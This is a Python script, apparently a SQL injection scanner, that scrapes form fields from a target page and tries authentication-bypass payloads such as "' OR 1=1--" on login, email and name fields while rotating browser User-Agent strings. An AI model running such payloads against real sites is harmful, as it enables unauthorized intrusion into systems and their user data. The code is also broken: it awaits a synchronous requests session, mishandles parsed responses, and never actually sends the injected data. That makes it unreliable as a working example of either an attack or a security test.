import requests
import random
import logging
import asyncio
from bs4 import BeautifulSoup

logging.basicConfig(level=logging.INFO)

async def check_sql_injection(url):
    session = requests.Session()
    headers = {'User-Agent': generate_user_agent()}
    
    try:
        response = await fetch(session, url, headers)
        if "sql syntax" in response.text.lower():
            logging.info(f"Potential SQL injection vulnerability found at: {url}")
        else:
            logging.info("No potential SQL injection vulnerabilities found.")

        input_fields = find_input_fields(response.text)
        prioritized_fields = prioritize_input_fields(input_fields)
        tasks = [test_field_for_sql_injection(session, url, field, headers) for field in prioritized_fields]
        await asyncio.gather(*tasks)
    except Exception as e:
        logging.error(f"Error occurred: {e}")

async def fetch(session, url, headers):
    logging.info(f"Fetching URL: {url}")
    async with session.get(url, headers=headers, timeout=10) as response:
        response.raise_for_status()
        return BeautifulSoup(await response.text(), 'html.parser')

async def test_field_for_sql_injection(session, url, field_info, headers):
    field_name, field_type = field_info
    injection_points = find_injection_points(field_name, field_type)
    payloads = generate_payloads()
    
    for point in injection_points:
        for payload in payloads:
            data = {field_name: inject_payload(field_type, point, payload)}
            try:
                response = await fetch(session, url, headers)
                if "error" in response.text.lower() or "exception" in response.text.lower():
                    logging.info(f"Potential SQL injection vulnerability found in field '{field_name}' at injection point '{point}' with payload: {payload}")
                    break
            except Exception as e:
                logging.error(f"Error occurred while testing field '{field_name}' at injection point '{point}' with payload '{payload}': {e}")

def generate_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Edg/89.0.774.45',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
        # Add more user agents as needed
    ]
    return random.choice(user_agents)

def find_input_fields(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    input_fields = []
    for tag in soup.find_all(['input', 'select', 'textarea']):
        if tag.get('name'):
            input_fields.append((tag.get('name'), tag.name))  # Store both name and type
        if tag.get('id'):
            input_fields.append((tag.get('id'), tag.name))  # Store both id and type
    return input_fields

def prioritize_input_fields(input_fields):
    prioritized_fields = []
    for field_info in input_fields:
        field_name, field_type = field_info
        if field_name.lower() in ['username', 'password']:
            prioritized_fields.append(field_info)
        elif 'email' in field_name.lower():
            prioritized_fields.append(field_info)
        elif 'name' in field_name.lower():
            prioritized_fields.append(field_info)
    return prioritized_fields

def find_injection_points(field_name, field_type):
    injection_points = []
    if field_type in ['input', 'textarea']:
        injection_points.append("';")  # Basic injection point for input and textarea
    elif field_type == 'select':
        injection_points.append("'")  # Basic injection point for select dropdowns
    return injection_points

def generate_payloads():
    payloads = [
        "1' OR '1'='1",
        "' OR 1=1--",
        "' OR ''='",
        "' OR 'x'='x",
        # Add more payloads as needed
    ]
    return payloads

def inject_payload(field_type, injection_point, payload):
    if field_type in ['input', 'textarea']:
        return f"{injection_point}{payload}"
    elif field_type == 'select':
        return payload

# Example usage:
target_url = "http://example.com/page?id=1"
asyncio.run(check_sql_injection(target_url))
